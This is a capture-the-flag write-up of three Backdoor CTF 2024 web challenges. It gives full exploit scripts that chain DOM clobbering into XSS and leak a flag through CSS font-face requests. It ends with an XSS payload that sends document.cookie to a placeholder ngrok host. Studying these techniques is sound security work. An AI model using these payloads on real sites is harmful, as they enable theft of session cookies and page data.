---
title: "Backdoor CTF 2024 - writeup"
date: "2024-12-24T00:00:00.000Z"
lang: EN
---


## ✅ Cascade Chaos (187pts 32solves)

### Overview

![](/assets/blog/backdoor/image.png)

You are presented with a markdown rendering service.  When you access the `/convert` endpoint with the `content` and `heading` parameters, the server parses the content with [showdown](https://github.com/showdownjs/showdown) markdown parser and displays it using the following code:
```javascript:index.js
app.get("/convert", (req, res) => {
    let content = req.query.content ? req.query.content : "";
    let heading = req.query.heading ? req.query.heading : "";
    content = converter.makeHtml(content);
    res.render('markdown', {
        title: "Markdown renderer",
        heading: encodeURIComponent(heading),
        body: encodeURIComponent(content)
    });
});
```

```ejs:markdown.ejs
<!doctype html>
<html lang="en">

<head>
  <!-- snap -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.0.1/purify.min.js"></script>
</head>

<body>
  <div class="heading">
  </div>

  <script>
    const heading = decodeURIComponent(`<%- heading -%>`);
    const headingDiv = document.querySelector(".heading");
    const content = DOMPurify.sanitize(heading);
    headingDiv.innerHTML = content;
  </script>
  <div class="content">
  </div>
  <button class="btn" id="showToAdminBtn">Show to Admin</button>

  <script>
    const body = decodeURIComponent(`<%- body -%>`);
    const contentDiv = document.querySelector(".content");
    if (window.isSafe) {
      contentDiv.innerHTML = body;
    } else {
      const sanitizedContent = DOMPurify.sanitize(body);
      contentDiv.innerHTML = sanitizedContent;
    }

    /* snap */

  </script>
</body>

</html>
```

There is another server that contains the flag. This server is only accessible to the bot.

```python:app.py
@app.route('/flag')
def flag():
    access_token = request.cookies.get('access_token')
    if access_token != SECRET_TOKEN:
        abort(403) 
    color = unquote(request.args.get('color', 'white'))
    flag=os.getenv('FLAG')
    return render_template('flag.html', color=color , flag=flag)
```

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <!-- snap  -->
    <style>
        :root {
        --flag-color: {{ color|safe }};
        }
        /* snap */
    </style>
</head>
<!-- snap -->
<body>
    <h3>Flag:</h3>
    <div class="flag"></div>
<script>
    // Flag visibility restricted to direct access only for security reasons
    if (window.name === "Flag") { 
        const flagContainer = document.querySelector(".flag");    
        const flagChars = "{{ flag }}".split("");
        // Breaking the flag into pieces, because fragmented flags are harder to steal... right?
        flagChars.forEach(char => {
            const span = document.createElement("span");
            span.textContent = char; 
            flagContainer.appendChild(span);
        });
    }
</script>    
</body>
</html>
```
When the condtion `window.name === "Flag"` is met, the flag is rendered like this:
![alt text](/assets/blog/backdoor/image-1.png)

When you send `heading` and `content` to the bot, the bot accesses the respective `/convert` endpoint.

```javascript:index.js
app.post("/visit", visitLimiter, (req, res) => { 
    try {
        let heading = req.body.heading
        let content = req.body.content
        if (content == undefined) {
            return res.status(200).send("Body is not provided")
        }
        const toReq = `${BASEURL}/convert?heading=${encodeURIComponent(heading)}&content=${encodeURIComponent(content)}`;
        const args = JSON.stringify({ url: toReq, cookie: SECRET_TOKEN });
        childProcess.spawn('node', ['./src/bot.js', args], { stdio: 'inherit' });
        console.log(args)
        return res.status(200).send("Admin will check!")
    } catch (e) {
        return res.status(500).send(e.message)
    }
})
```

```javascript:bot.js
async function visit(obj) {
    let browser;
    let url = obj['url'];
    let cookie = obj['cookie'];
    try {
        browser = await puppeteer.launch({
            /* snap */
        });
        let page = await browser.newPage();

        await page.setExtraHTTPHeaders({
            'Cookie': `access_token=${cookie}`
        });

        await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 10000 });
        await new Promise(r => setTimeout(r, 10000));
    } catch (e) {
        console.log(e);
    } finally {
        /* snap */
    }
}
```

### Solution

#### Step 1: DOM Clobbering

First step is to somehow run javascript code in the markdown server.

The following code shows that you can XSS if `window.isSafe` is met.

```javascript
if (window.isSafe) {
    contentDiv.innerHTML = body;
} else {
    const sanitizedContent = DOMPurify.sanitize(body);
    contentDiv.innerHTML = sanitizedContent;
}
```

This can be done via **DOM Clobbering**. The heading is sanitized using DOMPurify and is inserted before the content is inserted.

```javascript
const heading = decodeURIComponent(`<%- heading -%>`);
const headingDiv = document.querySelector(".heading");
const content = DOMPurify.sanitize(heading);
headingDiv.innerHTML = content;
```

Because DOMPurify does not delete `id` attribute, we can control the value of `window.isSafe`. Hence, if the heading is `<a id='isSafe'>x</a>`, `window.isSafe` becomes truthy, and the content is inserted without sanitization.

#### Step 2: Getting the flag 

Now you can make the bot access the flag server in various ways, such as iframe, `window.open` or location change.

By setting the `color` parameters, you can inject any string here:

```html
<style>
    :root {
    --flag-color: {{ color|safe }};
    }
    /* snap */
</style>
```

You can close the `<style>` tag and inject a `<script>` tag. I sent the whole content of `document.body.innerHTML`, which contains the flag, to my server.

### Full Exploit

```python:solver.py
import base64
import requests

# URL = "http://localhost:4001/"
URL = "http://35.224.222.30:4001/"
LOCAL = "http://local:4002/flag"
# LOCAL = "http://localhost:4002/flag"
EVIL = "https://xxx.ngrok.app/"


js = f"""document.location.assign("{LOCAL}?color=</style><script>setTimeout(()=>document.location.assign('{EVIL}?x='%2Bbtoa(document.body.innerHTML)),1000)</script>")""".strip()
encoded = base64.b64encode(js.encode()).decode()

s = requests.session()
data = {
    "heading": "<a id='isSafe'>x</a>",
    "content": f"""<img src=X onerror="eval(atob('{encoded}'))">"""
}
r = s.post(URL + "visit", json=data)
print(r.text)
# r = s.get(URL + "convert", params=data)
# print(r.url)
```

## ✅ Cascade Chaos Revenge (461pts 12solves)

### Overview

The revenge challenge now sanitizes the content of `color` parameter.

```diff python:app.py
--- cascade/src/local_service/app.py    2024-12-24 02:49:01.812508288 +0900
+++ cascade_revenge/src/local_service/app.py    2024-12-23 11:23:02.907709947 +0900
@@ -1,11 +1,19 @@
 from flask import Flask, render_template, request
 from flask import abort
 import os
+import html
+import re
 from urllib.parse import unquote
 
 app = Flask(__name__)
 SECRET_TOKEN = os.getenv('SECRET_TOKEN')
 
+def sanitize_css_value(value):
+    value = html.unescape(value)
+    value = re.sub(r'</?style>', '', value, flags=re.IGNORECASE)
+    value = re.sub(r'[<>]', '', value)
+    return value
+
 @app.route('/')
 def index():
     return 'Hello, Local World!'
@@ -14,10 +22,12 @@
 def flag():
     access_token = request.cookies.get('access_token')
     if access_token != SECRET_TOKEN:
-        abort(403) 
+        abort(403)
+    
     color = unquote(request.args.get('color', 'white'))
-    flag=os.getenv('FLAG')
-    return render_template('flag.html', color=color , flag=flag)
+    color = sanitize_css_value(color) 
+    flag = os.getenv('FLAG', 'FLAG{dummy_flag}')
+    return render_template('flag.html', color=color, flag=flag)
 
 if __name__ == '__main__':
     app.run()
```
### Solution

#### Step 1: Accessing the site with cookie

We want to use CSS injection to leak the flag. To do that, we need to somehow make `window.name === "Flag"` evaluate to true.

```javascript:flag.html
if (window.name === "Flag") { 
    const flagContainer = document.querySelector(".flag");    
    const flagChars = "{{ flag }}".split("");
    // Breaking the flag into pieces, because fragmented flags are harder to steal... right?
    flagChars.forEach(char => {
        const span = document.createElement("span");
        span.textContent = char; 
        flagContainer.appendChild(span);
    });
}
```
To achieve this, we have to open `http://local:4003/flag` using either `<iframe name='Flag'>` or `window.open(url, 'Flag')`. Normally, sending cross-origin cookies to an iframe or via `window.open` isn’t possible. However, in this challenge, sending cookies is possible because they are set using [setExtraHTTPHeaders](https://pptr.dev/api/puppeteer.page.setextrahttpheaders). This adds extra HTTP headers every time the Puppeteer browser makes a request.

```javascript
await page.setExtraHTTPHeaders({
    'Cookie': `access_token=${cookie}`
});
```

I'm not sure why, but this wasn’t possible if I used `window.open`. Using an `<iframe>` worked just fine.


#### Step 2: CSS Injection

[Reference: HackTricks - CSS Injection](https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection#text-node-exfiltration-i-ligatures)

Next, we want to leak the content of the page using CSS. We can use `@font-face` along with `unicode-range` to accomplish this.

When you define an `@font-face` rule with a `unicode-range`, the font file is only requested if characters in that range actually appear on the page.

For example, if the CSS looks like:

```css
@font-face{
    font-family: 'T';
    src: url('https://xxx.ngrok.app/leak/A');
    unicode-range:U+0041
}
span {
    font-family: 'T';
}
```
The request to `https://xxx.ngrok.app/leak/A` only occurs if the letter `A` (U+0041) actually appears in a `<span>` element. Essentially, the browser loads that specific font resource only if the content matches the specified unicode range.

In this challenge, each `<span>` element contains exactly one character. By selecting each `<span>` tag using the `:nth-child` selector, we can deduce which character is present in each `<span>` based on whether the font is requested.

### Full exploit

```python:solver.py
import threading
import urllib.parse
from flask import Flask, Response, render_template
import time
import requests
import requests
import string
import urllib

app = Flask(__name__)

REMOTE = False
# REMOTE = True

# USE_BOT = False
USE_BOT = True

URL = "http://35.224.222.30:4004/" if REMOTE else "http://localhost:4004/"
LOCAL = "http://local:4003/flag" if USE_BOT or REMOTE else "http://localhost:4003/flag"
EVIL = "https://xxx.ngrok.app/"


@app.route("/")
def index():
    return render_template("index.html")

def gen_css(n):
    x = [f"""@font-face{{font-family:'T';src:url('{EVIL}leak/{n}/{c}');unicode-range:U+{"{:04x}".format(ord(c))};}}"""
        for c in string.ascii_lowercase + string.digits + "_{}"]
    return "".join(x) + f""".flag span:nth-child({n+1}){{font-family: 'T';}}"""

def next(n):
    color = urllib.parse.quote("}" + gen_css(n))

    s = requests.session()
    data = {
        "heading": "<a id='isSafe'>x</a>",
        "content": f"""<iframe id=fr name=Flag src="{LOCAL}?color={color}"></iframe>"""
    }
    if USE_BOT:
        r = s.post(URL + "visit", json=data)
        print(r.text)
    else:
        r = s.get(URL + "convert", params=data)
        print(r.url)

cur = ""
@app.route("/leak/<n>/<c>")
def leak(n, c):
    global cur
    cur += c
    print(n, c)
    print(cur)
    time.sleep(13)
    next(int(n) + 1)
    return Response(status=200)


def solve():
    time.sleep(1)
    next(len(cur))

if __name__ == "__main__":
    thread = threading.Thread(target=solve)
    thread.start()
    app.run(port=9911)
```

## ✅ Juggernaut (406pts 17solves)

There isn’t much to say about this challenge. You can inject an unsanitized string via the `name` parameter to achieve XSS (probably unintended).

```html:view.html
<script>
    const csrf_token = "{{ csrf_token() }}";
    const rawUsername=`{{ username|safe }}`;
    const paramname=`{{name_param|safe}}`;
    /* snap */
</script>
```

Final payload:
```
http://35.224.222.30:4007/view?name=`;document.location.assign(%27https://xxx.ngrok.app/?%27%2Bdocument.cookie);`&note=677181182eda6575ba9af22c49400a43
```